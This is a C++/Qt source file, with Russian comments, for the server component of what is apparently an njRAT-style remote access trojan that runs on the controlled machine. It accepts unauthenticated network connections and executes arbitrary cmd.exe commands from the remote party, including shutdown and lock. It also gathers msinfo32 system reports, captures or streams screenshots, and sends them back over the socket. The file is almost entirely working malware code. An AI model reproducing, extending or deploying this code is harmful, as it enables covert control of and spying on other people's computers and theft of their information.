#include "njratserver.h"
#include <QBuffer>
#include <QFile>
#include <QGuiApplication>
#include <QMessageBox>
#include <QProcess>
#include <QScreen>
#include <QTextStream>
#include <QThread>

NjRatServer::NjRatServer()
{
    state = false;
}

NjRatServer::~NjRatServer()
{

}

void NjRatServer::startServer()
{
    if (this->listen(QHostAddress::Any, SERVER_PORT))
        qDebug() << "Listening";
    else
        qDebug() << "Not listening";
}

void NjRatServer::incomingConnection(int socketDescriptor)
{
    socket = new QTcpSocket(this);
    socket->setSocketDescriptor(socketDescriptor);
    state = true;

    connect(socket, SIGNAL(readyRead()), this, SLOT(socketReady()));
    connect(socket, SIGNAL(disconnected()), this, SLOT(socketDisc()));

    qDebug() << socketDescriptor << " Client connected";
}

void NjRatServer::socketReady()
{
    socket->waitForReadyRead(500);
    bufferData = socket->readAll();

    QString command;
    for (int i = 0; bufferData[i] != ':'; i++)
        command += bufferData[i];

    if (command == "verification")  // Проверка на наличие такого пользователя в бд
    {
        QString login;
        QString password;
        bool sysInfo = false;

        int i;
        for (i = 13; bufferData[i] != '$'; i++)
            login += bufferData[i];
        i++;
        for (; bufferData[i] != '$'; i++)
            password += bufferData[i];
        i++;
        if (bufferData[i])  // Если требуется передать системную информацию
            sysInfo = true;

        QString request = "success:1110";
        for (int i = 13; bufferData[i] != '$'; i++)
            request += bufferData[i];
        request += '$';

        if (sysInfo)    // Если требуется передать системную информацию
        {
            QProcess* process = new QProcess(this);
            QString sysCom = QString("cmd.exe %1 \"%2\"").arg("/C").arg("msinfo32 /report C:/NjTmpSysInfo.txt");
            process->start(sysCom);
            if (process->waitForStarted(-1))
                while (process->waitForReadyRead(-1));
            QFile file("C:/NjTmpSysInfo.txt");
            if (file.open(QIODevice::ReadOnly | QFile::Text))
            {
                QTextStream stream(&file);
                QString array = stream.readAll();
                request += array.toStdString().c_str();
                file.flush();
                file.close();
                QFile::remove("C:/NjTmpSysInfo.txt");
            }
        }

        socket->write((char*)(request.toStdWString().c_str()), request.size() * 2);   // Отправляем сигнал об успехе с разрешениями для данного пользователя
        socket->waitForBytesWritten(500);
        qDebug() << bufferData;
        return;
    }
    if (command == "message")
    {
        QString message;
        for (int i = 8; bufferData[i] != '$'; i++)
            message += bufferData[i];
        QMessageBox::about(nullptr, "Message", message.toStdString().c_str());
        QString request = "Ok";
        socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
        socket->waitForBytesWritten(500);
        qDebug() << bufferData;
        return;
    }
    if (command == "command")
    {
        QString typeCommand;
        int i;
        for (i = 8; bufferData[i] != '$'; i++)
            typeCommand += bufferData[i];

        QString cmd;
        i++;
        for (; bufferData[i] != '$'; i++)
            cmd += bufferData[i];

        if (cmd == "shutdown /s" ||
            cmd == "shutdown /r" ||
            cmd == "rundll32.exe PowrProf.dll,SetSuspendState" ||
            cmd == "rundll32.exe powrprof.dll,SetSuspendState 0,1,0" ||
            cmd == "Rundll32.exe User32.dll,LockWorkStation")
        {
            QString request = "Ok";
            socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
            socket->waitForBytesWritten(500);
            qDebug() << bufferData;
            QThread::sleep(10);
        }

        QProcess* process = new QProcess(this);
        QString sysCom = QString("cmd.exe %1 \"%2\"").arg("/C").arg(cmd);
        process->start(sysCom);
        if (process->waitForStarted(-1))
            while (process->waitForReadyRead(-1));

        if (typeCommand == "xmlSysFile")
        {
            QString request = "xmlSysFile:";
            QFile file("C:/NjTmpSysInfo.txt");
            if (file.open(QIODevice::ReadOnly | QFile::Text))
            {
                QTextStream stream(&file);
                QString array = stream.readAll();
                request += array.toStdString().c_str();
                file.flush();
                file.close();
                QFile::remove("C:/NjTmpSysInfo.txt");
            }
            socket->write((char*)(request.toStdWString().c_str()), request.size() * 2);
            socket->waitForBytesWritten(500);
            qDebug() << bufferData;
            return;
        }

        if (typeCommand == "file")
        {
            QString request = "operation:";
            QFile file("D:/NjTmpSysInfo.txt");
            if (file.open(QIODevice::ReadOnly | QFile::Text))
            {
                QTextStream stream(&file);
                QString array = stream.readAll();
                request += array.toStdString().c_str();
                file.flush();
                file.close();
                QFile::remove("D:/NjTmpSysInfo.txt");
            }
            socket->write(request.toStdString().c_str());
            socket->waitForBytesWritten(500);
            qDebug() << bufferData;
            return;
        }
    }
    if (command == "screen")
    {
         QScreen *screen = QGuiApplication::primaryScreen();
         QPixmap pix = screen->grabWindow(NULL);
         QByteArray bArray;
         QBuffer buffer(&bArray);
         buffer.open(QIODevice::WriteOnly);
         pix.save(&buffer, "PNG");

         QString isSharing;
         for (int i = 7; bufferData[i] != '$'; i++)
             isSharing += bufferData[i];

         if (isSharing.isEmpty())
         {
             QByteArray request = "screen:";
             for (int i = 0; i < bArray.size(); i++)
                 request += bArray[i];

             socket->write(request.toStdString().c_str(), request.size());
             socket->waitForBytesWritten(500);
             qDebug() << bufferData;
             return;
         }
         else
         {
             QByteArray request = "screenSharing:";
             for (int i = 0; i < bArray.size(); i++)
                 request += bArray[i];

             socket->write(request.toStdString().c_str(), request.size());
             socket->waitForBytesWritten(500);
             qDebug() << bufferData;
             return;
         }
    }
}

void NjRatServer::socketDisc()
{
    qDebug() << "Disconnected";

    socket->deleteLater();
    state = false;
}

void NjRatServer::close()
{
    qDebug() << "Server closed";

    if (state)
        socket->deleteLater();
    QTcpServer::close();
}
